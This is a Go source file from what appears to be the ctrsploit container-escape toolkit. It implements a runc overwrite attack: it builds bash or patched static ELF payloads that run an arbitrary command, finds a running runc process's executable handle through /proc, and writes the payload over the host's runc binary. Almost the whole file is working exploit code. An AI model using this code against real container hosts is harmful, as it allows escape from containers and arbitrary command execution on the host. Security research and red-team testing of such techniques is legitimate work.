package pipeprimitive

import (
	"bytes"
	"fmt"
	"runtime"
	"time"

	"github.com/ctrsploit/ctrsploit/pkg/pipe-primitive/runcwatch"
	"github.com/ctrsploit/sploit-spec/pkg/log"
)

func ShellPayload(cmd string) []byte {
	return []byte(fmt.Sprintf("#!/bin/bash\n%s\n", cmd))
}

func resolveRuncOverwritePayload(primitive Primitive, cmd string) ([]byte, error) {
	if provider, ok := primitive.(RuncOverwritePayloadProvider); ok {
		return provider.RuncOverwritePayload(cmd)
	}
	return ShellPayload(cmd), nil
}

func StaticShellPayload(cmd string) ([]byte, error) {
	if runtime.GOOS != "linux" || runtime.GOARCH != "amd64" {
		return nil, fmt.Errorf("static shell payload unsupported on %s/%s", runtime.GOOS, runtime.GOARCH)
	}
	return patchStaticShellPayload(staticShellPayloadAMD64, []string{"/bin/bash", "-c", cmd})
}

func patchStaticShellPayload(payload []byte, argv []string) ([]byte, error) {
	if len(payload) == 0 || payload[0] != 0x7f {
		return nil, fmt.Errorf("static shell payload must start with ELF magic prefix")
	}
	patched := append([]byte(nil), payload...)
	if err := patchStaticShellPayloadArgs(patched, argv); err != nil {
		return nil, err
	}
	return patched, nil
}

func patchStaticShellPayloadArgs(payload []byte, argv []string) error {
	if len(argv) == 0 {
		return fmt.Errorf("static shell payload argv is empty")
	}
	if len(argv) > staticShellMaxArgs {
		return fmt.Errorf("static shell payload argv count %d exceeds max %d", len(argv), staticShellMaxArgs)
	}

	marker := []byte(staticShellArgMarker)
	offset := bytes.Index(payload, marker)
	if offset < 0 {
		return fmt.Errorf("static shell payload arg marker not found")
	}
	argCountOffset := offset + len(marker)
	argBufsOffset := argCountOffset + 8
	argBufsLen := staticShellMaxArgs * staticShellArgBufSize
	if argBufsOffset+argBufsLen > len(payload) {
		return fmt.Errorf("static shell payload arg patch region exceeds payload length")
	}

	for i, arg := range argv {
		if len(arg)+1 > staticShellArgBufSize {
			return fmt.Errorf("static shell payload argv[%d] length %d exceeds max %d", i, len(arg), staticShellArgBufSize-1)
		}
	}
	for i := range 8 {
		payload[argCountOffset+i] = byte(uint64(len(argv)) >> (8 * i))
	}
	clear(payload[argBufsOffset : argBufsOffset+argBufsLen])
	for i, arg := range argv {
		start := argBufsOffset + i*staticShellArgBufSize
		copy(payload[start:start+staticShellArgBufSize], arg)
	}
	return nil
}

func OverwriteRunc(primitive Primitive, payload []byte, timeout time.Duration) error {
	handle, err := captureRunCHandle(timeout)
	if err != nil {
		return err
	}
	defer handle.Close()
	log.Logger.Infof("Found the runc PID: %d", handle.PID)
	log.Logger.Infof("Found the runc cmdline: %q", handle.Cmdline)
	log.Logger.Infof("Found the runc exe: %s", handle.Exe)
	log.Logger.Infof("Successfully got runc file handle: %d", handle.FD)

	path := fmt.Sprintf("/proc/self/fd/%d", handle.FD)
	if err := WriteImage(primitive, path, payload); err != nil {
		return fmt.Errorf("overwrite runc through %s: %w", path, err)
	}
	log.Logger.Infof("The runc has been overwritten with %d payload bytes", len(payload))
	return nil
}

func captureRunCHandle(timeout time.Duration) (runcwatch.Handle, error) {
	return runcwatch.CaptureHandle(timeout, runcwatch.OpenProcExeFile)
}

func isRunCCmdline(cmdline string) bool {
	return runcwatch.IsRunCCmdline(cmdline)
}
